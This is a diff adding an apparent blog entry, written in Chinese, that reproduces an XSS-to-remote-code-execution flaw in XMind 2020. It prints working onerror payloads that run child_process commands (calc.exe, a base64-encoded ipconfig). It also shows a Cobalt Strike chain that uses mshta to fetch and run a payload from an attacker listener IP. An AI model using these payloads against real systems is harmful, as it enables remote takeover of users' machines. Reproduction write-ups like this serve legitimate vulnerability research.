@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>XMind思维导图XSS漏洞复现</title>
+      <link href="2021/05177225.html"/>
+      <url>2021/05177225.html</url>
+      
+        <content type="html"><![CDATA[<p><strong>简介</strong>：XMind 是一个全功能的思维导图和头脑风暴软件，为激发灵感和创意而生。作为一款有效提升工作和生活效率的生产力工具，受到全球百千万用户的青睐。近期各大公众号平台曝出XMind xss存在远程执行RCE漏洞，我也是今天进行了漏洞复现。</p><p><strong>环境</strong>：XMind-2020-for-Windows-64bit-10.3.1-202101070032.exe</p><p><strong>复现</strong>：</p><p>1.打开XMind新建思维导图，进入大纲，测试基本xss代码。</p><p>payload：</p><pre><code>&lt;img src=# onerror=alert('1')&gt;</code></pre><p><img src="../images/4.png"></p><p><strong>注意</strong>：执行代码时，将光标放到语句最后，按空间键或者CTRL触发XSS执行</p><p>2.测试RCE命令，我们通过打开计算器来展示。</p><p>payload：</p><pre><code>&lt;img src=1 onerror="require('child_process').exec('calc.exe',null);"&gt;</code></pre><p><img src="../images/5.png"></p><p>3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置</p><p>payload：</p><pre><code>&lt;img src=# onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=`,`base64`).toString())'&gt;</code></pre><p>cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=经过base64解码是：</p><pre><code>require('child_process').exec('ipconfig /all',(error, stdout, stderr)=&gt;{    alert(`stdout: ${stdout}`);  });</code></pre><p><img src="../images/6.png"></p><p>4.我们直接上cs</p><p><img src="../images/7.png"></p><p>（1）首先我们生成一个powershell command的payload</p><p><img src="../images/8.png"></p><p>（2）接着我们利用cs的远程文件下载模块编辑远程下载url</p><p><img src="../images/9.png"></p><p> 生成的url为：</p><pre><code>http://你设置的监听器IP:80/download/file.ext</code></pre><p>接下来我们只要执行如下代码就可以上线cs，其中mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p><pre><code>mshta http://你设置的监听器IP:80/download/file.ext</code></pre><p>（3）接着我们构造执行的XSS代码</p><p>原始攻击payload：</p><pre><code>&lt;img src=# onerror='eval(new Buffer(`require('child_process').exec('command',(error, stdout, stderr)=&gt;{    alert(`stdout: ${stdout}`); });`,`base64`).toString())'&gt;</code></pre><p>其中我们可以在command处进行目录执行，我们就将我们的cs执行码输入进去，但是要记得用base64进行编码</p><p>接着我们就看到cs上线成功</p><p><img src="../images/10.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> XSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Centos7服务器安装java环境</title>
       <link href="2021/051762838.html"/>
       <url>2021/051762838.html</url>
